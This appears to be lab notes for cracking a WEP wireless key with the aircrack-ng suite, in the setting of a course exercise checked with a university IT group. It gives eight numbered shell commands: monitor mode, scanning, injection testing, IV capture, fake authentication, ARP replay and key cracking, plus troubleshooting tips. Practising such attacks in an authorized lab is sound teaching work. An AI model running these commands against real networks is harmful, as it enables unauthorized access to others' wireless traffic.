You should be able to crack the key by following these steps.
If not, check (with EngrIT) if the network is configured to allow this attack.

If aircrack-ng suite acts weird like:
    * doesn't start monitor mode
        - try killing the processes listed in the airmon-ng printout
    * when attempted to aireplay-ng, channel is fixed at -1
        - upgrade to v1.2 or reinstall aircrack-ng suite

How to crack WEP
    * 64 bit key needs about 10k-20k IVs
    * 128 bit key need about 40k+ IVs
    * From step 5 and on, you do not need to wait for the command to finish
        - Leave airodump-ng capturing packets
        - start fake authentication in another terminal
        - start cracking the key in another terminal right away

1. Put network interface into monitor mode
    $ sudo airmon-ng start {wireless_interface}
    * puts wireless interface into monitor mode
    * note that channel# is not specified in this step
    * a new virtual interface will be created
        - i.e. mon0 using aircrack-ng v1.1, wlan0mon on aircrack-ng v1.2

2. Scan all network in the surroundings
    $ sudo airodump-ng {monitor_interface}
    * take note of the bssid of the ssid and the channel# it uses

3. Restart the monitor mode with the channel# specified
    $ sudo airmon-ng stop {monitor_interface}
    $ sudo airmon-ng start {wireless_interface} {channel#}

4. Test packet injection
    $ sudo aireplay-ng -9 -e {ssid} -a {bssid} {monitor_interface}
    * the result (%) somewhat implies the strength of the wifi signal
    * if it's 0%, then either your pc cannot perform the attack or something went wrong with the aircrack-ng suite

5. Start capturing the IVs
    $ sudo airodump-ng -c {channel#} --bssid {bssid} -w {output_file} {monitor_interface}
    * specify the channel#
    * save output to file

6. Open another terminal, do fake authentication
    $ sudo aireplay-ng -1 6000 -o 1 -q 10 -e {ssid} -a {bssid} -h {your_mac} {monitor_interface}
    * if the result isn't great, play around with the options

7. [optional] ARP request replay, in another terminal
    $ sudo aireplay-ng -3 -b {bssid} -h {your_mac} {monitor_interface}
    * useful only when the client/server is generating arp requests (ie pinging to unassigned ip)

8. Open another terminal, start cracking the key using captured IVs
    $ sudo aircrack-ng -b {bssid} {all_capture_files}
    * aircrack-ng refreshes itself as more IVs are being captured
    * note that if you start arp request replay in the middle of cracking, you will need to restart aircrack-ng including the filename of the new capture file of arp request replay
